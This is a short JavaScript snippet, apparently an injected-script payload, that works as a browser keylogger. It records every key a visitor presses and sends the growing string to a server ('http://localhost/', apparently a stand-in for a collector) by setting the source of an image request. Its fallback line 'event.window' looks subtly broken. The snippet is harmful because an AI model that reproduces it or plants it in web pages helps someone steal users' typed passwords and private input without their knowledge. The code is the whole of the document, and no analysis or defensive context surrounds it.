var k = "";
document.onkeypress = function(e){
e = e || event.window;
	k+= e.key;
var i = new Image();
i.src = "http://localhost/" + k;
};
